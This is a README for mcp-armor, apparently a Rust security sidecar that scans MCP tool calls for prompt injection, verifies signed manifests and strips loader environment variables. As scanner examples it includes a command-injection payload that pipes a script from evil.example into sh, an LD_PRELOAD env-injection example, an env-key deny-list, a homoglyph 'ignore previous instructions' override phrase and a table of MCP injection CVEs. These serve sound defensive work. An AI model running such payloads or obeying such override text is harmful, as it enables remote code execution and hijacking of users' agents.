<!-- studiomeyer-mcp-stack-banner:start -->
> **Part of the [StudioMeyer MCP Stack](https://studiomeyer.io)** — Built in Mallorca 🌴 · ⭐ if you use it
<!-- studiomeyer-mcp-stack-banner:end -->

# mcp-armor

[![crates.io](https://img.shields.io/crates/v/mcp-armor.svg)](https://crates.io/crates/mcp-armor)
[![CI](https://github.com/studiomeyer-io/mcp-armor/actions/workflows/ci.yml/badge.svg)](https://github.com/studiomeyer-io/mcp-armor/actions/workflows/ci.yml)
[![Supply Chain](https://github.com/studiomeyer-io/mcp-armor/actions/workflows/supply-chain.yml/badge.svg)](https://github.com/studiomeyer-io/mcp-armor/actions/workflows/supply-chain.yml)
[![OpenSSF Scorecard](https://api.scorecard.dev/projects/github.com/studiomeyer-io/mcp-armor/badge)](https://scorecard.dev/viewer/?uri=github.com/studiomeyer-io/mcp-armor)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)

Drop-in Rust sidecar that wraps any MCP server. Scans tool calls for prompt injection, validates Ed25519 manifest signatures (with **TOFU keystore + Sigstore Rekor bridge** since v0.2), exports **OTLP gRPC telemetry** (on `opentelemetry 0.30` since v0.4 — closes the shutdown-hang class), blocks marketplace-poisoning vectors, **strips loader-class env keys from spawned children** (`LD_PRELOAD`, `NODE_OPTIONS`, … — new in v0.3), folds **Unicode confusables to detect homoglyph evasion** (Cyrillic `іgnоrе` ≈ `ignore` — new in v0.3). Single signed binary, p99 budget under 5 ms.

> Anthropic has classified the underlying MCP-design issues (auto-invoke, marketplace tool-list trust, no manifest signing) as out-of-scope for the spec. mcp-armor implements the runtime defenses they declined to spec.

mcp-armor sits between an MCP client (Claude Desktop, Windsurf, Cursor) and an upstream server. JSON-RPC traffic flows through a **four-stage scanner** (Aho-Corasick prefilter → regex stage → NFKC + zero-width + Bidi + tag-unicode strip → re-scan → UTS-39 confusable skeleton fold → re-scan). Block decisions are recorded to an in-memory ring buffer, and the read-only control-plane MCP server surfaces the audit history back to the client. On `wrap`, loader-class env keys (`LD_PRELOAD`, `NODE_OPTIONS`, `PYTHONPATH`, …) are stripped from the child process before `spawn()`.

Sister project: [studiomeyer-io/ai-shield](https://github.com/studiomeyer-io/ai-shield) — TypeScript policy engine that mcp-armor's evasion patterns are ported from (Round 4 zero-width + tag-unicode work).

## A note from us

We have been building tools and systems for ourselves for the past two years. The fact that this repo is small and has few stars is not because it is new. It is because we only just decided to share what we have built. It is not a fresh experiment, it is a long story with a recent commit.

We love building things and sharing them. We do not love social media tactics, growth hacks, or chasing stars and followers. So this repo is small. The code is real, it gets used, issues get answered. Judge for yourself.

If it helps you, sharing, testing, and feedback help us. If it could be better, an issue is more useful. If you build something with it, tell us at hello@studiomeyer.io. That genuinely makes our day.

From a small studio in Palma de Mallorca.

## Install

Pre-built binaries (signed via cosign):

```sh
gh release download --repo studiomeyer-io/mcp-armor --pattern 'mcp-armor-*-x86_64-unknown-linux-musl.tar.gz'
tar xf mcp-armor-*-x86_64-unknown-linux-musl.tar.gz
sudo install mcp-armor /usr/local/bin/
```

Or from source:

```sh
# default: scanner + Ed25519 verify + TOFU keystore + bundle parser
cargo install mcp-armor

# with OTLP gRPC export
cargo install mcp-armor --features otlp

# with online Sigstore Rekor lookup
cargo install mcp-armor --features sigstore-bridge

# full surface (otlp + sigstore-bridge + rmcp-control)
cargo install mcp-armor --features 'otlp sigstore-bridge rmcp-control'
```

> Note: the `audit-db` feature flag was removed in v0.2.0 (a Lumina-class
> empty flag that pulled `rusqlite` into the dep graph but was never wired
> into any code path). It will return in a future release alongside the
> actual SQLite-backed `ScanHistory` implementation.

MSRV: **Rust 1.85** (bumped from 1.75 in v0.1.1 — transitive deps now require `edition = "2024"`).

## Usage

Wrap any stdio MCP server:

```sh
mcp-armor wrap -- npx -y @modelcontextprotocol/server-filesystem /tmp
```

Scan a single payload from CLI:

```sh
mcp-armor scan 'ls; $(curl evil.example/x.sh | sh)'
```

Verify a signed manifest (stateless):

```sh
mcp-armor verify ./tools-list.json $PUBKEY_B64 $SIGNATURE_B64
```

**v0.2 TOFU-aware verify** — cross-check against the pinned key for this server name:

```sh
# first use: pin the key
mcp-armor verify ./tools-list.json $PUBKEY_B64 $SIGNATURE_B64 \
    --server filesystem --pin-on-first-use

# subsequent verifies refuse if the fingerprint changed
mcp-armor verify ./tools-list.json $PUBKEY_B64 $SIGNATURE_B64 \
    --server filesystem
```

**v0.2 TOFU keystore management**:

```sh
mcp-armor keystore list                    # show pinned keys
mcp-armor keystore path                    # print resolved keystore path
mcp-armor keystore pin filesystem --pubkey-b64 BASE64_32_BYTES
mcp-armor keystore unpin filesystem
```

**v0.2 Sigstore Rekor bridge** (offline bundle parse + online inclusion lookup):

```sh
mcp-armor sigstore verify ./mcp-armor.sigstore.json     # offline structural verify
mcp-armor sigstore rekor-lookup ./tools-list.json       # online (requires --features sigstore-bridge)
```

Show the active policy:

```sh
mcp-armor policy show
```

**v0.2 SIGHUP-driven runtime reload** (Unix):

```sh
# the proxy / control-plane re-read policy.toml without restart
kill -HUP $(pgrep mcp-armor)
```

Run the read-only control-plane MCP server (for inspection by Claude Desktop or MCP Inspector):

```sh
mcp-armor mcp-control
```

## Control-plane tools

The `mcp-armor mcp-control` server exposes **10 read-only tools** (6 from v0.1 + 3 from v0.2 + 1 added in v0.5). All have `readOnlyHint: true` and `destructiveHint: false`. The control plane speaks MCP spec **`2025-11-25`** since v0.7 (was `2025-06-18` v0.1 through v0.6).

| Tool | Description |
|---|---|
| `armor_scan_payload` | Scan an arbitrary payload, return verdict + matched patterns + CVE refs + latency |
| `armor_verify_manifest` | Ed25519 verify over canonical-JSON form of a tools/list response |
| `armor_list_blocked` | Read recent blocked tool calls from the in-memory ring buffer |
| `armor_get_policy` | Return policy file path, rules, fail mode, scan flags, version |
| `armor_check_cve` | Look up a server name (+ optional version) in the curated CVE feed |
| `armor_simulate_attack` | Run the static `simulate_payload` for a CVE through the scanner. Never spawns the upstream binary |
| `armor_get_keystore` | **v0.2** — List pinned TOFU maintainer public keys (server_name + fingerprint + pinned_at_iso) |
| `armor_verify_bundle` | **v0.2** — Parse a cosign sigstore.json bundle and structurally verify the Rekor SET shape. Offline |
| `armor_rekor_lookup` | **v0.2** — Query the Sigstore Rekor transparency log for inclusion of a manifest's artifact hash. Requires `--features sigstore-bridge` |
| `armor_get_drift_history` | **v0.5** — Inspect the tools-list schema-drift baselines (Layer 7). Read-only, optional `program` filter, no caller-supplied path |

The control plane runs by default as a hand-rolled JSON-RPC stdio server (no extra crate deps). Operators who want the official Anthropic MCP Rust SDK on the wire can compile in the parallel rmcp 1.5 control plane via `--features rmcp-control` (v0.7 finally wires this; v0.2 through v0.6 shipped it as a stub that advertised tools but refused calls). Both planes share one dispatcher — same 10 tools, same semantics, same `protocolVersion`.

## Scanner pipeline

Hot-path is **four** stages (since v0.3), all in-process:

1. **Aho-Corasick prefilter** — case-insensitive trigger strings sourced from the CVE feed (signal only — never drives Block on its own).
2. **Regex stage** — compiled once on construction. Confirmed regex hits are the sole verdict signal.
3. **Unicode normalize + re-scan** — strip zero-width (U+200B…U+200F, U+2060…U+2064, U+FEFF), Bidi formatting (U+202A…U+202E, U+2066…U+2069), and tag-unicode (U+E0000…U+E007F), apply NFKC, re-run stages 1 and 2. Gated by `policy.scan_unicode`.
4. **(v0.3) UTS-39 confusable skeleton + re-scan** — fold Cyrillic / Greek / Cherokee / Latin-Extended look-alikes back to ASCII via a hand-curated ~180-entry table (`src/scanner/confusable.rs`), then re-run stages 1 and 2. Catches `іgnоrе previous instructions` where i / o / e are Cyrillic. Cheap pre-gate via `has_confusables()` keeps the p99 budget intact for pure-ASCII payloads. Gated by `policy.scan_confusable`.

Performance budget: p99 < 5 ms on 100 kB payloads. CI gates a 7 ms hard cliff on `cargo bench --bench scanner`.

## Loader-class env defence (v0.3)

`mcp-armor wrap` now strips a default 7-entry deny-list of loader-class environment variables from the **child** process before spawn:

- Dynamic linker: `LD_PRELOAD`, `LD_LIBRARY_PATH`, `DYLD_INSERT_LIBRARIES`, `DYLD_LIBRARY_PATH`
- Language runtime: `NODE_OPTIONS`, `PYTHONPATH`, `JAVA_TOOL_OPTIONS`

This closes the **Zealynx 2026 stdio-config side-channel** where a registry-fetched MCP manifest can specify `env: { LD_PRELOAD: "/evil.so" }` and bypass the binary signature verify entirely (env injection is upstream of `exec`). Operators may extend the list via `policy.deny_env_keys`; setting it to `[]` disables the guard. The sidecar also emits a startup `warn!` listing exactly which loader-class keys the operator's shell is leaking into the wrap process.

## CVE coverage (v0.1.0, OX advisory wave 2026-04-15)

| CVE | Severity | Title | Fixed in |
|---|---|---|---|
| CVE-2026-27124 | critical | FastMCP shell-injection via unsanitized tool args | fastmcp ≥ 2.4.0 |
| CVE-2025-49596 | high | MCP Inspector unsanitized localhost callback | mcp-inspector ≥ 1.3.1 |
| CVE-2026-30615 | critical | Windsurf zero-click RCE via auto_invoke tool | windsurf ≥ 1.4.7 |
| CVE-2025-65720 | high | GPT Researcher prompt-injection via search-result markdown | gpt-researcher ≥ 0.12.4 |
| CVE-2026-22252 | high | LibreChat manifest-tampering via MITM | librechat ≥ 0.7.9 |
| CVE-2026-30623 | high | LiteLLM tool-result injection | litellm ≥ 1.61.0 |
| CVE-2026-22688 | medium | Generic tool-output zero-width-char obfuscation | n/a (defense-in-depth) |
| CVE-2026-30888 | high | Marketplace mirror swaps tools/list response | n/a (defense-in-depth) |
| CVE-2026-31104 | medium | Tag-Unicode evasion of pattern scanners | n/a (defense-in-depth) |
| CVE-2026-31312 | medium | Fullwidth-Unicode evasion of pattern scanners | n/a (defense-in-depth) |

`cargo test --test cve_simulation` enforces the round-trip in CI. `armor_check_cve` does **semver-range matching** in v0.2 when both `server_version` is supplied AND the entry has an `affected_versions` range.

## Compatibility

| OS | Arch | Status |
|---|---|---|
| Linux | x86_64 (gnu) | supported |
| Linux | x86_64 (musl, static) | supported |
| macOS | aarch64 | supported |
| Windows | any | v0.3 backlog |

## Telemetry

**v0.2 status:** stderr-only JSON via `tracing` by default. With `--features otlp` at build time AND `OTEL_EXPORTER_OTLP_ENDPOINT` set at runtime, mcp-armor wires `opentelemetry-otlp` with `grpc-tonic` + `BatchSpanProcessor::Tokio` and emits a `mcp_armor.block` span every time the proxy returns -32603 to a client.

Allow verdicts never reach the tracing layer — only block decisions emit spans, so the per-call hot-path cost stays at the scanner's Aho+Regex cost. The OTel batch processor flushes asynchronously and the `OtelGuard::drop()` calls `provider.shutdown()` on sigterm/Ctrl-C so the tail of the audit trail makes it out.

```sh
# stderr-only (v0.1 behaviour, also the v0.2 default)
mcp-armor wrap -- npx some-mcp-server

# full OTLP gRPC export
OTEL_EXPORTER_OTLP_ENDPOINT=http://otel-collector:4317 \
    mcp-armor wrap -- npx some-mcp-server
```

## Manifest signature verification

`armor_verify_manifest` (and `mcp-armor verify`) perform pure cryptographic Ed25519 signature verification over the canonical-JSON form (RFC-8785-flavoured) of a `tools/list` response.

**v0.2 — TOFU continuity layer** (`verify_with_tofu` / `mcp-armor verify --server <name> --pin-on-first-use`). On first use the operator pins the maintainer's public-key fingerprint; subsequent verifies refuse to validate if a different key is presented for the same server name. Closes the marketplace-mirror class where both manifest and pubkey are swapped together.

Keystore lives at `$XDG_DATA_HOME/mcp-armor/keys.toml` (or `~/.local/share/mcp-armor/keys.toml`). On Unix the file is created with mode `0o600`; persist is atomic via same-directory `rename(2)` after `fsync`.

For binary provenance, verify the release artifact via cosign — and use `mcp-armor sigstore verify`/`rekor-lookup` to anchor the binary's sigstore.json in the Rekor transparency log:

```sh
cosign verify-blob --bundle mcp-armor.sigstore.json mcp-armor
mcp-armor sigstore verify mcp-armor.sigstore.json
mcp-armor sigstore rekor-lookup mcp-armor.sigstore.json   # requires --features sigstore-bridge
```

## Policy

Policy file lives at `$XDG_CONFIG_HOME/mcp-armor/policy.toml` (or `~/.config/mcp-armor/policy.toml`). Override with `--policy /path/to/policy.toml` or env `MCP_ARMOR_POLICY`. Default policy:

```toml
fail_mode       = "closed"     # block on verdict==block
scan_unicode    = true         # stage 3 (NFKC + zero-width + Bidi strip)
scan_confusable = true         # stage 4 (v0.3: UTS-39 skeleton fold)
allow_patterns  = []           # pattern ids to never block
allow_servers   = []           # server names that bypass the scanner
version         = "default"

# v0.3 — loader-class env keys stripped from child on `wrap`. When
# omitted, the 7-entry default applies. Empty list ([]) disables the
# guard. Custom list REPLACES default (no merge).
deny_env_keys = [
    "LD_PRELOAD", "LD_LIBRARY_PATH",
    "DYLD_INSERT_LIBRARIES", "DYLD_LIBRARY_PATH",
    "NODE_OPTIONS", "PYTHONPATH", "JAVA_TOOL_OPTIONS",
]

# v0.2 — per-tool allowlist (REVIEW.md F3 Sub-b mitigation).
# Map tool_name -> [pattern_ids]. When a scanner match is on `tool_name`
# AND every matched pattern id is in this tool's list, the call passes
# despite the Block verdict.
[allow_patterns_per_tool]
"code-interpreter" = ["shell_substitution"]
"web-fetch"        = ["javascript_uri", "localhost_callback"]
```

`fail_mode = "open"` switches to warn-and-pass (logged but forwarded).

**v0.2 SIGHUP reload** — `kill -HUP $(pgrep mcp-armor)` re-reads the policy file without restarting the proxy. The hot-path takes a fresh snapshot per envelope so the new rules apply to the next message.

**v0.2 0o600 advisory** — if the policy file is world or group readable on Unix, a `warn!` log line surfaces the recommendation. Refusal to load is intentionally not enforced (would break existing 0o644 setups).

## Development

```sh
cargo fmt --check
cargo clippy --all-targets --all-features -- -D warnings
cargo test --all-features
cargo bench --bench scanner
```

173 tests pass on the default build (lib + 8 v0.4 regressions in
`tests/integration_v04_features.rs` + the rest of the v0.2/v0.3
integration suite), 172 with `--all-features` (one
`cfg(not(feature = "sigstore-bridge"))` test correctly skipped). Per-
feature breakdown in CHANGELOG v0.4.0 "Pre-tag gates run locally".

## Status

**v0.4.x — production.** The four-stage scanner, Ed25519 verify, TOFU
keystore (now `flock`-protected on concurrent pin), Sigstore bundle
parser, OTLP exporter (on the `opentelemetry 0.30` SDK with the
shutdown-hang class closed), the 9-tool control-plane, loader-class
env-key strip, and UTS-39 confusable defence are all stable for daily
use as a stdio sidecar in front of trusted MCP servers. v0.4 cashes in
every documented v0.3-backlog item except the rmcp 1.x SDK migration
and the Rekor-v2 tiles verifier, both of which are now v0.5 backlog
with concrete crate targets (see CHANGELOG).

| Area | Status |
|---|---|
| stdio proxy + scanner pipeline (4 stages) | shipped, p99 < 5 ms enforced in CI |
| Ed25519 manifest verify (stateless) | shipped |
| TOFU keystore (`~/.local/share/mcp-armor/keys.toml`) | shipped in v0.2 |
| **TOFU `flock`-protected concurrent pin (`persist_locked`)** | **shipped in v0.4** |
| Sigstore bundle parser + structural Rekor SET verify | shipped in v0.2 (offline, always available) |
| **`verify_inclusion.shape_only_ok` rename + mandatory `warning` field** | **shipped in v0.4** |
| Sigstore Rekor REST lookup-by-hash | shipped in v0.2 behind `--features sigstore-bridge` |
| **OTLP gRPC export on `opentelemetry-otlp 0.30`** | **shipped in v0.4** (closes the v0.27 shutdown-hang class) |
| **rmcp 0.1.5 → 1.5 migration (closes CVE-2026-42559 transitively, MCP protocolVersion `2025-11-25`)** | **shipped in v0.7** (fully-wired `ServerHandler` impl behind `--features rmcp-control`, both control planes share one dispatcher) |
| Per-tool pattern allowlist | shipped in v0.2 |
| SIGHUP policy reload (Unix) | shipped in v0.2 |
| `armor_check_cve` semver-range matching | shipped in v0.2 |
| Loader-class env-key strip on `wrap` | shipped in v0.3 |
| UTS-39 confusable skeleton (Stage 4) | shipped in v0.3 |
| Supply-chain CI (CycloneDX SBOM + OSV + cargo-deny + Scorecard) | shipped in v0.3 |
| **Audit-trail SHA-256 on RustCrypto `sha2` (replaces hand-rolled)** | **shipped in v0.4** |
| **Parent-dir `fsync` after keystore atomic rename** | **shipped in v0.4** |
| **`PIN_OUTCOME_*` public constants instead of magic strings** | **shipped in v0.4** |
| **Proxy `tokio::join!` + explicit child kill/wait (zombie-child fix)** | **shipped in v0.4** |
| rmcp `#[tool_router]` macro path (single derive site for schemas) | v0.8 backlog — manual impl is intentional today (one schema SSOT across both planes) |
| Rekor v2 tiles-based verifier via `sigstore-rekor 0.8` | v0.5 backlog |
| Cryptographic SET verify against Rekor pubkey (TUF) | v0.5 backlog |
| Fulcio cert-chain verification | v0.5 backlog |
| `tracing-opentelemetry 0.33` auto-bridge | v0.5 backlog |
| mTLS client cert for OTLP gRPC | v0.5 backlog |
| Windows targets | v0.5 backlog — Linux + macOS only |

Security disclosure policy: [SECURITY.md](SECURITY.md). Contributing
guide: [CONTRIBUTING.md](CONTRIBUTING.md).

## License

MIT — see [LICENSE](LICENSE). Copyright 2026 Matthias Meyer (StudioMeyer).
